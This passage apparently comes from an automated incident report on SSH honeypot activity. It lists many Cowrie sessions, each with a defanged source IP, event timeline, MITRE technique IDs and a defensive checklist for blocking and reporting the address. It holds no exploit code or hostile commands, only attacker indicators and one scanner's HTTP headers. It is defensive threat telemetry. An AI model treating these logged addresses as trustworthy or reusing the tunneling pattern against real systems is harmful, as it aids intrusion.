- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59e0fc64aee9

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]210` |
| **First Seen** | 2026-08-05 06:38 |
| **Last Seen** | 2026-08-05 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:38:17` | `cowrie.session.connect` |
| `2026-08-05 06:38:17` | `cowrie.client.version` |
| `2026-08-05 06:38:17` | `cowrie.client.kex` |
| `2026-08-05 06:38:18` | `cowrie.login.success` |
| `2026-08-05 06:38:18` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:38:18` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]210` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5168f0838ce5

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]227` |
| **First Seen** | 2026-08-05 06:42 |
| **Last Seen** | 2026-08-05 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:42:54` | `cowrie.session.connect` |
| `2026-08-05 06:42:54` | `cowrie.client.version` |
| `2026-08-05 06:42:54` | `cowrie.client.kex` |
| `2026-08-05 06:42:55` | `cowrie.login.success` |
| `2026-08-05 06:42:56` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:42:56` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]227` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0969263c25e0

| Field | Detail |
|---|---|
| **Source IP** | `43.228.157[.]105` |
| **First Seen** | 2026-08-05 06:43 |
| **Last Seen** | 2026-08-05 06:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:43:31` | `cowrie.session.connect` |
| `2026-08-05 06:43:31` | `cowrie.client.version` |
| `2026-08-05 06:43:31` | `cowrie.client.kex` |
| `2026-08-05 06:43:31` | `cowrie.login.success` |
| `2026-08-05 06:43:31` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:43:31` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.228.157[.]105` to AbuseIPDB if not already reported
- [ ] Block `43.228.157[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a7529e8738e

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]21` |
| **First Seen** | 2026-08-05 06:43 |
| **Last Seen** | 2026-08-05 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:43:52` | `cowrie.session.connect` |
| `2026-08-05 06:43:52` | `cowrie.client.version` |
| `2026-08-05 06:43:52` | `cowrie.client.kex` |
| `2026-08-05 06:43:53` | `cowrie.login.success` |
| `2026-08-05 06:43:53` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:43:53` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60f16069d136

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-05 06:44 |
| **Last Seen** | 2026-08-05 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:44:38` | `cowrie.session.connect` |
| `2026-08-05 06:44:38` | `cowrie.client.version` |
| `2026-08-05 06:44:38` | `cowrie.client.kex` |
| `2026-08-05 06:44:39` | `cowrie.login.success` |
| `2026-08-05 06:44:39` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:44:39` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-260dfbf91ac6

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-08-05 06:47 |
| **Last Seen** | 2026-08-05 06:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:47:53` | `cowrie.session.connect` |
| `2026-08-05 06:47:53` | `cowrie.client.version` |
| `2026-08-05 06:47:53` | `cowrie.client.kex` |
| `2026-08-05 06:47:55` | `cowrie.login.success` |
| `2026-08-05 06:47:55` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3447ad5e3f93

| Field | Detail |
|---|---|
| **Source IP** | `65.20.153[.]146` |
| **First Seen** | 2026-08-05 06:48 |
| **Last Seen** | 2026-08-05 06:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:48:05` | `cowrie.session.connect` |
| `2026-08-05 06:48:05` | `cowrie.client.version` |
| `2026-08-05 06:48:05` | `cowrie.client.kex` |
| `2026-08-05 06:48:06` | `cowrie.login.success` |
| `2026-08-05 06:48:07` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.153[.]146` to AbuseIPDB if not already reported
- [ ] Block `65.20.153[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbebe4958d8e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-05 06:52 |
| **Last Seen** | 2026-08-05 06:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:52:06` | `cowrie.session.connect` |
| `2026-08-05 06:52:06` | `cowrie.client.version` |
| `2026-08-05 06:52:06` | `cowrie.client.kex` |
| `2026-08-05 06:52:06` | `cowrie.login.success` |
| `2026-08-05 06:52:06` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:52:06` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e3c289a17c9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]110` |
| **First Seen** | 2026-08-05 06:53 |
| **Last Seen** | 2026-08-05 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:53:35` | `cowrie.session.connect` |
| `2026-08-05 06:53:35` | `cowrie.client.version` |
| `2026-08-05 06:53:35` | `cowrie.client.kex` |
| `2026-08-05 06:53:36` | `cowrie.login.success` |
| `2026-08-05 06:53:36` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:53:36` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]110` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b712ab1eb41

| Field | Detail |
|---|---|
| **Source IP** | `64.89.162[.]146` |
| **First Seen** | 2026-08-05 06:59 |
| **Last Seen** | 2026-08-05 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 06:59:51` | `cowrie.session.connect` |
| `2026-08-05 06:59:51` | `cowrie.client.version` |
| `2026-08-05 06:59:51` | `cowrie.client.kex` |
| `2026-08-05 06:59:52` | `cowrie.login.success` |
| `2026-08-05 06:59:52` | `cowrie.direct-tcpip.request` |
| `2026-08-05 06:59:53` | `cowrie.direct-tcpip.data` |
| `2026-08-05 06:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.162[.]146` to AbuseIPDB if not already reported
- [ ] Block `64.89.162[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5042e3bd0808

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-05 07:03 |
| **Last Seen** | 2026-08-05 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:03:20` | `cowrie.session.connect` |
| `2026-08-05 07:03:20` | `cowrie.client.version` |
| `2026-08-05 07:03:20` | `cowrie.client.kex` |
| `2026-08-05 07:03:21` | `cowrie.login.success` |
| `2026-08-05 07:03:21` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:03:21` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2e5384b0cb4

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-05 07:03 |
| **Last Seen** | 2026-08-05 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:03:41` | `cowrie.session.connect` |
| `2026-08-05 07:03:41` | `cowrie.client.version` |
| `2026-08-05 07:03:41` | `cowrie.client.kex` |
| `2026-08-05 07:03:42` | `cowrie.login.success` |
| `2026-08-05 07:03:42` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:03:42` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51afd951c8ac

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]206` |
| **First Seen** | 2026-08-05 07:04 |
| **Last Seen** | 2026-08-05 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:04:42` | `cowrie.session.connect` |
| `2026-08-05 07:04:42` | `cowrie.client.version` |
| `2026-08-05 07:04:42` | `cowrie.client.kex` |
| `2026-08-05 07:04:43` | `cowrie.login.success` |
| `2026-08-05 07:04:43` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:04:43` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]206` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24092cc124a4

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-05 07:08 |
| **Last Seen** | 2026-08-05 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:08:19` | `cowrie.session.connect` |
| `2026-08-05 07:08:19` | `cowrie.client.version` |
| `2026-08-05 07:08:19` | `cowrie.client.kex` |
| `2026-08-05 07:08:19` | `cowrie.login.success` |
| `2026-08-05 07:08:19` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:08:20` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498c150329ad

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]223` |
| **First Seen** | 2026-08-05 07:12 |
| **Last Seen** | 2026-08-05 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:12:35` | `cowrie.session.connect` |
| `2026-08-05 07:12:35` | `cowrie.client.version` |
| `2026-08-05 07:12:35` | `cowrie.client.kex` |
| `2026-08-05 07:12:35` | `cowrie.login.success` |
| `2026-08-05 07:12:36` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:12:36` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-923628267d4f

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]41` |
| **First Seen** | 2026-08-05 07:18 |
| **Last Seen** | 2026-08-05 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:18:59` | `cowrie.session.connect` |
| `2026-08-05 07:18:59` | `cowrie.client.version` |
| `2026-08-05 07:18:59` | `cowrie.client.kex` |
| `2026-08-05 07:19:00` | `cowrie.login.success` |
| `2026-08-05 07:19:00` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:19:00` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]41` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd85fcada747

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-08-05 07:21 |
| **Last Seen** | 2026-08-05 07:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:21:36` | `cowrie.session.connect` |
| `2026-08-05 07:21:36` | `cowrie.client.version` |
| `2026-08-05 07:21:36` | `cowrie.client.kex` |
| `2026-08-05 07:21:37` | `cowrie.login.success` |
| `2026-08-05 07:21:38` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a063590de87

| Field | Detail |
|---|---|
| **Source IP** | `106.0.166[.]123` |
| **First Seen** | 2026-08-05 07:22 |
| **Last Seen** | 2026-08-05 07:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:22:38` | `cowrie.session.connect` |
| `2026-08-05 07:22:39` | `cowrie.client.version` |
| `2026-08-05 07:22:39` | `cowrie.client.kex` |
| `2026-08-05 07:22:41` | `cowrie.login.success` |
| `2026-08-05 07:22:42` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.0.166[.]123` to AbuseIPDB if not already reported
- [ ] Block `106.0.166[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcb5f6a05a74

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]42` |
| **First Seen** | 2026-08-05 07:22 |
| **Last Seen** | 2026-08-05 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:22:40` | `cowrie.session.connect` |
| `2026-08-05 07:22:40` | `cowrie.client.version` |
| `2026-08-05 07:22:40` | `cowrie.client.kex` |
| `2026-08-05 07:22:40` | `cowrie.login.success` |
| `2026-08-05 07:22:41` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:22:41` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c817937db9

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]19` |
| **First Seen** | 2026-08-05 07:33 |
| **Last Seen** | 2026-08-05 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:33:13` | `cowrie.session.connect` |
| `2026-08-05 07:33:13` | `cowrie.client.version` |
| `2026-08-05 07:33:13` | `cowrie.client.kex` |
| `2026-08-05 07:33:13` | `cowrie.login.success` |
| `2026-08-05 07:33:14` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:33:14` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]19` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83568137c55

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 07:33 |
| **Last Seen** | 2026-08-05 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:33:17` | `cowrie.session.connect` |
| `2026-08-05 07:33:17` | `cowrie.client.version` |
| `2026-08-05 07:33:17` | `cowrie.client.kex` |
| `2026-08-05 07:33:18` | `cowrie.login.success` |
| `2026-08-05 07:33:18` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:33:18` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e735b0699a02

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]225` |
| **First Seen** | 2026-08-05 07:37 |
| **Last Seen** | 2026-08-05 07:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:37:06` | `cowrie.session.connect` |
| `2026-08-05 07:37:06` | `cowrie.client.version` |
| `2026-08-05 07:37:06` | `cowrie.client.kex` |
| `2026-08-05 07:37:06` | `cowrie.login.success` |
| `2026-08-05 07:37:07` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:37:07` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]225` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-514a15b98fc8

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-05 07:37 |
| **Last Seen** | 2026-08-05 07:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:37:49` | `cowrie.session.connect` |
| `2026-08-05 07:37:49` | `cowrie.client.version` |
| `2026-08-05 07:37:49` | `cowrie.client.kex` |
| `2026-08-05 07:37:50` | `cowrie.login.success` |
| `2026-08-05 07:37:50` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:37:50` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81655c0836a3

| Field | Detail |
|---|---|
| **Source IP** | `45.33.14[.]5` |
| **First Seen** | 2026-08-05 07:38 |
| **Last Seen** | 2026-08-05 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:38:44` | `cowrie.session.connect` |
| `2026-08-05 07:38:44` | `cowrie.login.success` |
| `2026-08-05 07:38:44` | `cowrie.session.params` |
| `2026-08-05 07:38:44` | `cowrie.command.input` |
| `2026-08-05 07:38:44` | `cowrie.command.failed` |
| `2026-08-05 07:38:44` | `cowrie.command.input` |
| `2026-08-05 07:38:44` | `cowrie.command.failed` |
| `2026-08-05 07:38:44` | `cowrie.command.input` |
| `2026-08-05 07:38:44` | `cowrie.command.failed` |
| `2026-08-05 07:38:44` | `cowrie.command.input` |
| `2026-08-05 07:38:45` | `cowrie.log.closed` |
| `2026-08-05 07:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.14[.]5` to AbuseIPDB if not already reported
- [ ] Block `45.33.14[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

